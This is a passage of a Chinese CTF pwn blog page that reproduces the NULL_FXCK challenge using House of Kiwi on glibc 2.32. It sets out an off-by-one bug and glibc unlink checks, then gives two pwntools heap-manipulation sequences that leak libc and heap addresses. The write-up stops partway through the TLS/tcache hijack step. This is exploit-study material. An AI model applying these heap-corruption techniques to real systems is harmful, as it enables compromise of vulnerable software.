<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
<meta name="theme-color" content="#222">
<meta name="generator" content="Hexo 5.4.0">
  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png">
  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png">
  <link rel="mask-icon" href="/images/logo.svg" color="#222">

<link rel="stylesheet" href="/css/main.css">


<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">

<script id="hexo-configurations">
    var NexT = window.NexT || {};
    var CONFIG = {"hostname":"example.com","root":"/","scheme":"Gemini","version":"7.8.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":false,"show_result":false,"style":null},"back2top":{"enable":true,"sidebar":false,"scrollpercent":false},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":false,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}}};
  </script>

  <meta property="og:type" content="website">
<meta property="og:title" content="Pwn进你的心">
<meta property="og:url" content="http://example.com/page/4/index.html">
<meta property="og:site_name" content="Pwn进你的心">
<meta property="og:locale" content="en_US">
<meta property="article:author" content="yhellow">
<meta name="twitter:card" content="summary">

<link rel="canonical" href="http://example.com/page/4/">


<script id="page-configurations">
  // https://hexo.io/docs/variables.html
  CONFIG.page = {
    sidebar: "",
    isHome : true,
    isPost : false,
    lang   : 'en'
  };
</script>

  <title>Pwn进你的心</title>
  






  <noscript>
  <style>
  .use-motion .brand,
  .use-motion .menu-item,
  .sidebar-inner,
  .use-motion .post-block,
  .use-motion .pagination,
  .use-motion .comments,
  .use-motion .post-header,
  .use-motion .post-body,
  .use-motion .collection-header { opacity: initial; }

  .use-motion .site-title,
  .use-motion .site-subtitle {
    opacity: initial;
    top: initial;
  }

  .use-motion .logo-line-before i { left: initial; }
  .use-motion .logo-line-after i { right: initial; }
  </style>
</noscript>

</head>

<body itemscope itemtype="http://schema.org/WebPage">
  <div class="container use-motion">
    <div class="headband"></div>

    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
      <div class="header-inner"><div class="site-brand-container">
  <div class="site-nav-toggle">
    <div class="toggle" aria-label="Toggle navigation bar">
      <span class="toggle-line toggle-line-first"></span>
      <span class="toggle-line toggle-line-middle"></span>
      <span class="toggle-line toggle-line-last"></span>
    </div>
  </div>

  <div class="site-meta">

    <a href="/" class="brand" rel="start">
      <span class="logo-line-before"><i></i></span>
      <h1 class="site-title">Pwn进你的心</h1>
      <span class="logo-line-after"><i></i></span>
    </a>
  </div>

  <div class="site-nav-right">
    <div class="toggle popup-trigger">
    </div>
  </div>
</div>




<nav class="site-nav">
  <ul id="menu" class="main-menu menu">
        <li class="menu-item menu-item-home">

    <a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a>

  </li>
        <li class="menu-item menu-item-tags">

    <a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a>

  </li>
        <li class="menu-item menu-item-categories">

    <a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a>

  </li>
        <li class="menu-item menu-item-archives">

    <a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a>

  </li>
  </ul>
</nav>




</div>
    </header>

    
  <div class="back-to-top">
    <i class="fa fa-arrow-up"></i>
    <span>0%</span>
  </div>


    <main class="main">
      <div class="main-inner">
        <div class="content-wrap">
          

          <div class="content index posts-expand">
            
      
  
  
  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
    <link itemprop="mainEntityOfPage" href="http://example.com/2022/08/06/House%20Of%20Kiwi-2.32-64/">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="yhellow">
      <meta itemprop="description" content="">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="Pwn进你的心">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          
            <a href="/2022/08/06/House%20Of%20Kiwi-2.32-64/" class="post-title-link" itemprop="url">House Of Kiwi-2.32-64</a>
        </h2>

        <div class="post-meta">
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-calendar"></i>
              </span>
              <span class="post-meta-item-text">Posted on</span>

              <time title="Created: 2022-08-06 13:16:35" itemprop="dateCreated datePublished" datetime="2022-08-06T13:16:35+08:00">2022-08-06</time>
            </span>
              <span class="post-meta-item">
                <span class="post-meta-item-icon">
                  <i class="far fa-calendar-check"></i>
                </span>
                <span class="post-meta-item-text">Edited on</span>
                <time title="Modified: 2022-08-08 14:43:22" itemprop="dateModified" datetime="2022-08-08T14:43:22+08:00">2022-08-08</time>
              </span>
            <span class="post-meta-item">
              <span class="post-meta-item-icon">
                <i class="far fa-folder"></i>
              </span>
              <span class="post-meta-item-text">In</span>
                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
                  <a href="/categories/Pwn-train/" itemprop="url" rel="index"><span itemprop="name">Pwn train</span></a>
                </span>
            </span>

          
            <span class="post-meta-item" title="Symbols count in article">
              <span class="post-meta-item-icon">
                <i class="far fa-file-word"></i>
              </span>
              <span>11k</span>
            </span>
            <span class="post-meta-item" title="Reading time">
              <span class="post-meta-item-icon">
                <i class="far fa-clock"></i>
              </span>
              <span>10 mins.</span>
            </span>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">

      
          <p><strong>NULL_FXCK 复现</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">GNU C <span class="title">Library</span> <span class="params">(Ubuntu GLIBC <span class="number">2.32</span><span class="number">-0u</span>buntu3)</span> release release version 2.32</span></span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">main: ELF <span class="number">64</span>-bit LSB shared object, x86<span class="number">-64</span>, version <span class="number">1</span> (SYSV), dynamically linked, interpreter /lib64/ld-linux-x86<span class="number">-64.</span>so<span class="number">.2</span>, BuildID[sha1]=<span class="number">1463577</span>d47e320d9b46df83575b5778e3368f79f, <span class="keyword">for</span> GNU/Linux <span class="number">3.2</span><span class="number">.0</span>, stripped</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Full RELRO</span><br><span class="line">    Stack:    Canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      PIE enabled</span><br></pre></td></tr></table></figure>
<ul>
<li>64位，dynamically，全开</li>
</ul>
<p>开了沙盒：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0000</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000004</span>  A = arch</span><br><span class="line"><span class="number">0001</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x05</span> <span class="number">0xc000003e</span>  <span class="keyword">if</span> (A != ARCH_X86_64) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0002</span>: <span class="number">0x20</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  A = sys_number</span><br><span class="line"><span class="number">0003</span>: <span class="number">0x35</span> <span class="number">0x00</span> <span class="number">0x01</span> <span class="number">0x40000000</span>  <span class="keyword">if</span> (A &lt; <span class="number">0x40000000</span>) <span class="keyword">goto</span> <span class="number">0005</span></span><br><span class="line"><span class="number">0004</span>: <span class="number">0x15</span> <span class="number">0x00</span> <span class="number">0x02</span> <span class="number">0xffffffff</span>  <span class="keyword">if</span> (A != <span class="number">0xffffffff</span>) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0005</span>: <span class="number">0x15</span> <span class="number">0x01</span> <span class="number">0x00</span> <span class="number">0x0000003b</span>  <span class="keyword">if</span> (A == execve) <span class="keyword">goto</span> <span class="number">0007</span></span><br><span class="line"><span class="number">0006</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x7fff0000</span>  <span class="keyword">return</span> ALLOW</span><br><span class="line"><span class="number">0007</span>: <span class="number">0x06</span> <span class="number">0x00</span> <span class="number">0x00</span> <span class="number">0x00000000</span>  <span class="keyword">return</span> KILL</span><br></pre></td></tr></table></figure>
<ul>
<li>只能用 ORW</li>
</ul>
<p><strong>漏洞分析</strong></p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> __fastcall <span class="title">edit</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int64 idx; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 index; <span class="comment">// rbx</span></span><br><span class="line">  _BYTE *chunk; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">char</span> buf[<span class="number">10</span>]; <span class="comment">// [rsp+Eh] [rbp-2Ah] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v4; <span class="comment">// [rsp+18h] [rbp-20h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  edit_key = <span class="number">0LL</span>;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Index: &quot;</span>, <span class="number">7uLL</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xA</span>uLL);</span><br><span class="line">  idx = strtol(buf, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="keyword">if</span> ( !chunk_list[idx] || (index = idx, idx &gt; <span class="number">0x1F</span>) )</span><br><span class="line">  &#123;</span><br><span class="line">    write(<span class="number">1</span>, <span class="string">&quot;Error Index ):\n&quot;</span>, <span class="number">0xF</span>uLL);</span><br><span class="line">    _exit(<span class="number">1</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  write(<span class="number">1</span>, <span class="string">&quot;Content: &quot;</span>, <span class="number">9uLL</span>);</span><br><span class="line">  chunk = (_BYTE *)chunk_list[index];</span><br><span class="line">  chunk[read(<span class="number">0</span>, chunk, size_list[index])] = <span class="number">0</span>;  <span class="comment">// off-by-one</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>有一个 off-by-one</li>
</ul>
<p><strong>入侵思路</strong></p>
<p>这次尝试使用 House Of Kiwi 来解题，首先要使用这个 off-by-one 来进行 leak，但 libc-2.29 版本以后增加了一些检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* consolidate backward */</span></span><br><span class="line">    <span class="keyword">if</span> (!prev_inuse(p)) &#123;</span><br><span class="line">      prevsize = prev_size (p);</span><br><span class="line">      size += prevsize;</span><br><span class="line">      p = chunk_at_offset(p, -((<span class="keyword">long</span>) prevsize));</span><br><span class="line">      <span class="keyword">if</span> (__glibc_unlikely (chunksize(p) != prevsize))</span><br><span class="line">        malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size while consolidating&quot;</span>);</span><br><span class="line">      unlink_chunk (av, p);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>需要 last chunk-&gt;size == victim chunk-&gt;presize</li>
</ul>
<p>unlink 中也有一些检查：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (chunksize (p) != prev_size (next_chunk (p)))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted size vs. prev_size&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>需要 victim chunk-&gt;size == next chunk-&gt;presize</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (__builtin_expect (fd-&gt;bk != p || bk-&gt;fd != p, <span class="number">0</span>))</span><br><span class="line">  malloc_printerr (<span class="string">&quot;corrupted double-linked list&quot;</span>);</span><br></pre></td></tr></table></figure>
<ul>
<li>fd-&gt;bk == p：chunkP 的下一个 chunk 的上一个 chunk 是不是 chunkP</li>
<li>bk-&gt;fd == p：chunkP 的上一个 chunk 的下一个 chunk 是不是 chunkP</li>
</ul>
<p>由于没法 leak heap_base，就要通过以下的办法进行绕过：</p>
<ul>
<li>使用 large chunk 遗留的 fd_nextsize 和 bk_nextsize 指针<ul>
<li>以 fd_nextsize 为 fake_chunk 的 fd</li>
<li>以 bk_nextsize 为 fake_chunk 的 bk</li>
</ul>
</li>
<li>也可以使用 unsorted chunk 或者 large chunk 的 FD BK 指针，就是对堆风水的要求比较高</li>
</ul>
<p><strong>heap 风水的构建</strong></p>
<p>我自己弄的时候一头雾水，忙活了一个下午也没有搞出来，晚上参考了几个 wp，这里我说下思路：</p>
<p>思路一：</p>
<ul>
<li>合并两个 unsortedbin，在 <code>0x000</code> 处留下如下的 heap 结构</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x5639c214c000</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x5639c214c000</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x5639c214c008</span> ◂— <span class="number">0x501</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x5639c214c010</span> —▸ <span class="number">0x5639c214ca00</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x5639c214c018</span> —▸ <span class="number">0x5639c214d400</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用 unsortedbin 遗留下来的 FD BK 指针进行操作，往 <code>0xa00-&gt;bk</code> 和 <code>0x400-&gt;fd</code> 中写入 <code>0x030</code>，然后利用程序的末尾置空把 <code>0x030</code> 改为 <code>0x000</code></li>
<li>修改 <code>0x000-&gt;size=0xa00</code>，修改 <code>0xa00-&gt;pre_size=0xa00</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x148</span>) <span class="comment">#0   </span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x1f8</span>) <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#8</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#9</span></span><br><span class="line">add(<span class="number">0x4f8</span>) <span class="comment">#10</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># key-0xa00</span></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">8</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x528</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0xa00</span>))<span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x4c0</span>) <span class="comment">#4 padding</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#6 0x400</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#8 key-0xa00</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#4 0x030 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x4c8</span>) <span class="comment">#5</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># key-0xa00 - bk=0x030</span></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># 0x030</span></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># 0x400 - fd=0x030</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x4f0</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>+<span class="string">&quot;\x00&quot;</span>)<span class="comment">#4 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#6 padding-0x030</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#8 padding</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">6</span>) <span class="comment"># 0x030</span></span><br><span class="line">free(<span class="number">8</span>) <span class="comment"># 0x400 - fd=0x030</span></span><br><span class="line">free(<span class="number">7</span>) <span class="comment"># 0xf00</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x520</span>,<span class="string">b&quot;a&quot;</span>*<span class="number">0x4f0</span>+p64(<span class="number">0</span>)+p64(<span class="number">0x501</span>)+<span class="string">b&#x27;\x00&#x27;</span>)<span class="comment">#6 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x4c8</span>) <span class="comment">#8 padding</span></span><br><span class="line">add(<span class="number">0x4f0</span>) <span class="comment">#7 padding</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">5</span>,<span class="string">b&quot;b&quot;</span>*<span class="number">0x4c0</span>+p64(<span class="number">0xa00</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">4</span>) <span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0x520</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x1000</span>) </span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&quot;\x00&quot;</span>))-<span class="number">0x1e4160</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;libc_base&quot;</span>,<span class="built_in">hex</span>(libc_base))</span><br></pre></td></tr></table></figure>
<p>思路二：</p>
<ul>
<li>合并两个 unsortedbin，在 <code>0xd00</code> 处留下如下的 heap 结构</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x55f18f2d1d00</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x55f18f2d1d00</span> ◂— <span class="number">0x6161616161616161</span> (<span class="string">&#x27;aaaaaaaa&#x27;</span>)</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x55f18f2d1d08</span> ◂— <span class="number">0xc91</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x55f18f2d1d10</span> —▸ <span class="number">0x55f18f2d12b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x55f18f2d1d18</span> —▸ <span class="number">0x55f18f2d2350</span> ◂— <span class="number">0x0</span></span><br></pre></td></tr></table></figure>
<ul>
<li>利用 unsortedbin 遗留下来的 FD BK 指针进行操作，往 <code>0x2b0-&gt;bk</code> 和 <code>0x350-&gt;fd</code> 中写入 <code>0xd20</code>，然后利用程序的末尾置空把 <code>0xd20</code> 改为 <code>0xd00</code></li>
<li>申请一个大 chunk 使 <code>0x350</code> 进入 largebin，这里主要是为了改变 chunk 的取出方式（largebin 从大到小进行组织-插头取头，unsortedbin FIFO-插头取尾）</li>
<li>修改 <code>0xd00-&gt;size=0xc91</code>，修改 <code>0x990-&gt;pre_size=0xc90</code></li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">add(<span class="number">0x418</span>) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x1f8</span>) <span class="comment">#1</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#2</span></span><br><span class="line">add(<span class="number">0x438</span>) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#4</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#6</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">free(<span class="number">3</span>)</span><br><span class="line">free(<span class="number">5</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x440</span>,<span class="number">0x428</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc91</span>)) <span class="comment">#0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3 0x2b0</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#2 0xd20 - over \x00 to bk/fd</span></span><br><span class="line">add(<span class="number">0x428</span>) <span class="comment">#5 0x370</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0x2b0 - bk=0xd20</span></span><br><span class="line">free(<span class="number">2</span>) <span class="comment"># 0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>,<span class="string">&#x27;a&#x27;</span>*<span class="number">8</span>+<span class="string">&quot;\x00&quot;</span>) <span class="comment">#2 修复fd-&gt;bk(低位覆盖\x00)</span></span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#3</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># 0xd20</span></span><br><span class="line">free(<span class="number">5</span>) <span class="comment"># 0x350 - fd=0xd20</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x9f8</span>) <span class="comment">#3 make 0x350 to large </span></span><br><span class="line">add(<span class="number">0x428</span>,<span class="string">&#x27;\x00&#x27;</span>) <span class="comment">#5 修复bk-&gt;fd(低位覆盖\x00)</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">6</span>,<span class="number">0x200</span>*<span class="string">&#x27;a&#x27;</span>+p64(<span class="number">0xc90</span>))</span><br><span class="line">add(<span class="number">0x418</span>) <span class="comment">#7</span></span><br><span class="line">add(<span class="number">0x208</span>) <span class="comment">#8</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">3</span>) <span class="comment"># unlink</span></span><br><span class="line">add(<span class="number">0x430</span>,flat(<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,p64(<span class="number">0x421</span>))) <span class="comment">#3</span></span><br><span class="line">add(<span class="number">0x1600</span>) <span class="comment">#9</span></span><br><span class="line">show(<span class="number">4</span>)</span><br><span class="line"></span><br><span class="line">libcbase=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x1e4230</span></span><br><span class="line">log.success(<span class="string">&#x27;libc_base: &#x27;</span>+<span class="built_in">hex</span>(libcbase))</span><br><span class="line">show(<span class="number">5</span>)</span><br><span class="line">heap=u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>,<span class="string">&#x27;\x00&#x27;</span>))-<span class="number">0x2b0</span></span><br><span class="line">log.success(<span class="string">&#x27;heap_base: &#x27;</span>+<span class="built_in">hex</span>(heap))</span><br></pre></td></tr></table></figure>
<ul>
<li>PS：可能需要一些爆破来得到远程 TLS 的偏移</li>
<li>参考这位大佬的博客：<a target="_blank" rel="noopener" href="https://blog.wjhwjhn.com/archives/593/">通过LIBC基址来爆破TLS</a> </li>
</ul>
<p>两个思路最核心的地方就是：</p>
<ul>
<li>获取两个 unsorted chunk 进行合并，其中的第二个 chunk 末地址必须为 <code>\x00</code>（遗留下 FD BK 指针）</li>
<li>重新申请大 unsorted chunk 后释放（不破坏原来的 heap 结构），然后再次进行分割，使第二个 chunk 的末尾地址为 <code>\x30</code> 或者 <code>\x40</code> <code>\x50</code> 等等（有一定偏移的地址都可以）</li>
<li>之后利用 unsortedbin 进行调整，在 FD-&gt;bk 和 BK-&gt;fd 中写入 <code>\x30</code>，然后覆盖为 <code>\x00</code></li>
</ul>
<p>因为 [思路二] 可以泄露 heap_base，这里选择 [思路二]</p>
<p><strong>通过 TLS 劫持 tcache struct 以实现三次 WAA</strong></p>
<p>House Of Kiwi 需要三次 WAA，用常规的 WAA 不能到达目的，只能劫持 main_arena</p>
<p>malloc_init 会在 heap 段开设一个内存用于管理 tcache（第一个 chunk，tcache struct），而 tcache struct 的地址，可以从 heapbase 被我们劫持到另一个地方：</p>
<ul>
<li>tcache struct 的地址被记录在 TLS 段中，只要修改这里就可以劫持 tcache struct</li>
<li>通过以下方法可以找到 TLS 段的位置：</li>
</ul>
